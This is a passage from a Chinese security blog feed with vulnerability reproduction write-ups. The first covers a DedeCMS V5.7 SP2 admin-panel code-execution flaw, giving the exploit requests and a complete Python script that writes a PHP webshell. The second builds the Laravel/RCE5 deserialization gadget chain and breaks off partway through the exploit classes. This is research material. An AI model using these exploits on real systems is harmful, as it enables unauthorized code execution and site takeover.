        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的 tpl.php 中存在代码执行漏洞，可以通过该漏洞在增加新标签中上传木马，获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>此漏洞位于后台，因此我们需要先登录到后台</p><p>默认后台地址 dede/ ，先按照网上已有的文章复现</p><p>先获取 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?action&#x3D;upload</span><br></pre></td></tr></table></figure><p>得到 token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?filename&#x3D;secnote.lib.php&amp;action&#x3D;savetagfile&amp;content&#x3D;&lt;?php phpinfo();?&gt;&amp;token&#x3D;33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure><p>这时就已经写入了 webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;include&#x2F;taglib&#x2F;secnote.lib.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/image-20210626220121525.png"></p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>根据上面的漏洞复现，我们知道问题在文件 dede/tpl.php</p><p>可以看到，tpl.php 中是根据 action 进行不同的动作，我们定位到我们的目标 action，savetagfile 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">csrf_check();</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$wintitle</span> = <span class="string">&quot;成功修改/创建文件！&quot;</span>;</span><br><span class="line"><span class="variable">$wecome_info</span> = <span class="string">&quot;&lt;a href=&#x27;templets_tagsource.php&#x27;&gt;标签源码碎片管理&lt;/a&gt; &amp;gt;&amp;gt; 修改/新建标签&quot;</span>;</span><br><span class="line"><span class="variable">$win</span> = <span class="keyword">new</span> OxWindow();</span><br><span class="line"><span class="variable">$win</span>-&gt;AddTitle(<span class="string">&quot;修改/新建标签：&quot;</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;AddMsgItem(<span class="variable">$msg</span>);</span><br><span class="line"><span class="variable">$winform</span> = <span class="variable">$win</span>-&gt;GetWindow(<span class="string">&quot;hand&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;Display();</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>csrf_check 函数内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$token</span>) || strcasecmp(<span class="variable">$token</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就需要一个 <code>$token</code>，而我们怎样给 <code>$token</code> 赋值呢</p><p>tpl.php 中请求了一次 config.php，config.php 中又请求了一次 include/common.inc.php</p><p>在该文件的 109 行，这里将 GET，POST，COOKIE 传进来的值全都转换成了变量，这样的处理设置很容易造成变量覆盖等问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>) $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">        <span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此这里我们就很容易给 <code>$token</code> 赋值，至于找到 token ，就属于比较简单的事情了，之前的复现也给我们提供了一种方法</p><p>接下来是 <code>$filename</code>，只要满足 xxxx.lib.php 就行，也可以通过 GET等方式传值进来</p><p>再然后是这几行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p><code>$filename</code> 赋值给 <code>$tagname</code>，<code>$content</code> 也可以像之前一样传值进来</p><p><code>$truefile</code> 就是最终的 webshell 位置，最后直接写入，实现代码执行</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;menuitems&#x27;</span>: <span class="string">&#x27;1_1%2C2_1%2C3_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;03vl33l9qoqgkud8lotrjqao61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf&#x27;</span>: <span class="string">&#x27;0bfdaa5a43a74e6a73c647bd6bccea74&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf__ckMd5&#x27;</span>: <span class="string">&#x27;abc564ee99b944d5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID__ckMd5&#x27;</span>: <span class="string">&#x27;d217f47f5438b1c4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime&#x27;</span>: <span class="string">&#x27;1624719766&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime__ckMd5&#x27;</span>: <span class="string">&#x27;8f80d0af54e33e54&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span>(<span class="params">url</span>):</span></span><br><span class="line">    uploadurl = url + <span class="string">&#x27;/dede/tpl.php?action=upload&#x27;</span></span><br><span class="line">    html = s.get(uploadurl, cookies=cookies).text</span><br><span class="line">    token = re.findall(<span class="string">&quot;&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27;&quot;</span>, html)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span>(<span class="params">url, token</span>):</span></span><br><span class="line">    getshellurl = url + <span class="string">&#x27;/dede/tpl.php?action=savetagfile&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;shell.lib.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(getshellurl, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    shellurl = url + <span class="string">&#x27;/include/taglib/shell.lib.php&#x27;</span></span><br><span class="line">    html = s.get(shellurl, cookies=cookies).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;PHP Version&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell success &quot;</span> + shellurl)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    token = getToken(url)</span><br><span class="line">    getShell(url, token)</span><br><span class="line">    check(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要替换自己进入后台之后的 cookies</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这个漏洞只是 dede 提供的一个文件管理的功能，但是被利用了，基本上只要进到后台，利用这个还是很容易getshell的。</p><p>该过程实际上就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板 -&gt; 标签源码管理 -&gt; 增加一个新的标签</span><br></pre></td></tr></table></figure><p>然后填入自己的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel/RCE5 反序列化</title>
      <link href="2021/04/21/laravel-RCE5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2021/04/21/laravel-RCE5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>最近一直在搞 laravel 的反序列化链，吸收前辈的知识，这必然要来分析一下 phpggc 里面的链，搭起来的环境是 laravel 5.7 的，试了下，把可以影响的几条链都分析一下。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>还是使用之前的入口，其他的没有改变，这里只做分析，不去考虑影响的范围，这是 phpggc 输出的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name           : Laravel/RCE5</span><br><span class="line">Version        : 5.8.30</span><br><span class="line">Type           : RCE (PHP code)</span><br><span class="line">Vector         : __destruct</span><br><span class="line">Informations   : </span><br><span class="line">Executes given PHP code through <span class="built_in">eval</span>().</span><br><span class="line">Requires Mockery, <span class="built_in">which</span> is <span class="keyword">in</span> the require-dev package.</span><br><span class="line"></span><br><span class="line">./phpggc Laravel/RCE5 &lt;code&gt;</span><br></pre></td></tr></table></figure><p>这里写的 5.8.30 ，但实际上影响范围也不止这个</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="从-exp-开始分析"><a href="#从-exp-开始分析" class="headerlink" title="从 exp 开始分析"></a>从 exp 开始分析</h3><p>分析漏洞 exp ，最终代码执行是在 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mockery\Loader\EvalLoader</span><br></pre></td></tr></table></figure><p>我们来看看这里的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">MockDefinition <span class="variable">$definition</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists(<span class="variable">$definition</span>-&gt;getClassName(), <span class="literal">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="variable">$definition</span>-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话，存在 eval，可以执行代码，但我们需要找到一个地方执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mockery\Loader\EvalLoader-&gt;load</span><br></pre></td></tr></table></figure><p>并且 <code>$definition</code> 可控，<code>$definition</code> 应该为实例化的 MockDefinition，找到此处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$connection</span> = <span class="variable">$command</span>-&gt;connection ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$queue</span> = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, <span class="variable">$connection</span>);</span><br></pre></td></tr></table></figure><p>通过反序列化，我们可以随意控制 <code>$this-&gt;queueResolver</code> ，而 <code>$connection</code> 又是由 <code>$command</code> 控制，我们来看看，在哪里调用了这个函数， ctrl+b 搜到一处调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued(<span class="variable">$command</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到这里就熟悉了，之前也有用到过这里，<code>$command</code> 也是可以控制的，我们看到调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好是可以反序列化的</p><h3 id="开始自己写exp"><a href="#开始自己写exp" class="headerlink" title="开始自己写exp"></a>开始自己写exp</h3><p>首先是直接用一个反序列化，<code>$this-&gt;events</code> 用到可以调用 dispatch 的类，当然在这里只能使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Bus\Dispatcher</span><br></pre></td></tr></table></figure><p>这里 <code>$this-&gt;event</code> 将会进入下面这里 ，是这里面的 <code>$command</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;</span><br></pre></td></tr></table></figure><p>我们看看 <code>$this-&gt;commandShouldBeQueued</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$command</span> <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要是 ShouldQueue 的实例，直接搜索，就得到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\BroadcastEvent</span><br></pre></td></tr></table></figure><p>因此得到如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue(<span class="variable">$command</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span>(<span class="params"><span class="variable">$command</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$connection</span> = <span class="variable">$command</span>-&gt;connection ?? <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$queue</span> = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, <span class="variable">$connection</span>);</span><br></pre></td></tr></table></figure><p>这里需要一个 connection ，这个我们可以自定义</p><p><code>$this-&gt;queueResolver</code> 也可以自定有，就可以进入我们的目标位置，所以可以得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到该位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params">MockDefinition <span class="variable">$definition</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (class_exists(<span class="variable">$definition</span>-&gt;getClassName(), <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="variable">$definition</span>-&gt;getCode());</span><br></pre></td></tr></table></figure><p>这里的参数类型为 MockDefinition，所以我们上面的 connection 就可以定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看看 getClassName()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要定义一个 <code>$this-&gt;config</code> ，在他的 <code>__construct</code> 函数里面参数定义我们可以知道，可以使用这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span 